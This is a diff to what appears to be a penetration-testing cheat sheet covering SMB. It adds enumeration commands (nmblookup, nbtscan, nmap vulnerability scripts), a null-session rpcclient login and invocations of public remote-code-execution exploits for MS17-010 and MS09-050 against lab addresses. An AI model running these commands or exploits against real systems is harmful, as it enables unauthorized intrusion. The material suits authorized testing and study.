@@ -9,6 +9,13 @@ https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf
 
 
 ### SMB
+https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+
+```console
+nmblookup -A 192.168.76.40
+nbtscan 192.168.76.40
+nmap --script smb-vuln* 192.168.76.40
+```
 ```console
 nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
 ```
@@ -49,7 +56,7 @@ smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
 
 ### rpcclient
 ```Shell
-rpcclient -U "" 10.10.10.52 #null session
+rpcclient -U "" -N 10.10.10.52 #null session
 enumdomusers
 
 rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers"
@@ -475,6 +482,17 @@ https://github.com/worawit/MS17-010.git
 python checker.py 127.0.0.1
 python zzz_exploit.py 127.0.0.1 samr
 ```
+https://www.exploit-db.com/exploits/42031
+```Shell
+python 42031.py 192.168.76.40 MS17-010/sc_x86_msf.bin
+```
+
+#### MS09_050 RCE SMB2 
+https://www.exploit-db.com/exploits/40280
+
+https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
+
+python MS09_050.py 192.168.76.40
 
 ## Post Explotation
 
